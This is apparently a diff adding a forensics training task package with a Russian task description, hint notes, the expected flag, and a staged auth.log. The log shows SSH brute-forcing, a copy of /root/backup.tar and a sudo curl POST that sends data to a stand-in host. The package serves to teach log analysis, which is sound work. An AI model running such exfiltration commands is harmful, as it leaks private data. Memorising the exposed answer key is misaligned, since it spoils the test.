@@ -1,0 +1,28 @@
+{
+  "id": "forensics-log-analysis",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{l0g5_n3v3r_l13_4nd_n31th3r_d0_4tt4ck3rs}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Задача: найти след атакующего в логах\n\nДан `auth.log`. Ночью кто-то подобрал пароль и закрепился. Нужно\nпонять, с какого IP шёл перебор и что атакующий сделал после входа.\n\nШаги:\n1. Найди IP с массой `Failed password`: `grep \"Failed password\" auth.log | cut -d\" \" -f11 | sort | uniq -c | sort -rn`.\n2. Посмотри всё, что делал этот IP: `grep \"<IP>\" auth.log`.\n3. Найди строку с выгрузкой данных — там флаг. Запиши в `found.txt`.\n"
+    },
+    {
+      "path": "/home/student/task/notes.txt",
+      "text": "Заметки:\n- В логах ищи не только неудачи, но и то, что было ПОСЛЕ успешного входа.\n- Эксфильтрация часто видна как curl/wget в командной строке sudo.\n"
+    },
+    {
+      "path": "/home/student/task/auth.log",
+      "text": "Jan 14 02:11:01 web01 sshd[4011]: Failed password for invalid user admin from 203.0.113.66 port 51234 ssh2\nJan 14 02:11:03 web01 sshd[4011]: Failed password for invalid user root from 203.0.113.66 port 51240 ssh2\nJan 14 02:11:05 web01 sshd[4011]: Failed password for invalid user oracle from 203.0.113.66 port 51246 ssh2\nJan 14 02:11:07 web01 sshd[4011]: Failed password for player from 203.0.113.66 port 51252 ssh2\nJan 14 02:11:09 web01 sshd[4012]: Accepted password for player from 203.0.113.66 port 51258 ssh2\nJan 14 02:11:12 web01 sudo:   player : TTY=pts/0 ; PWD=/home/player ; USER=root ; COMMAND=/bin/cp /root/backup.tar /tmp/backup.tar\nJan 14 02:12:40 web01 sudo:   player : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -s -X POST http://198.51.100.9/u -d data=nto{l0g5_n3v3r_l13_4nd_n31th3r_d0_4tt4ck3rs}\nJan 14 02:13:00 web01 sshd[4020]: pam_unix(sshd:session): session closed for user player\n"
+    }
+  ],
+  "tools": {}
+}
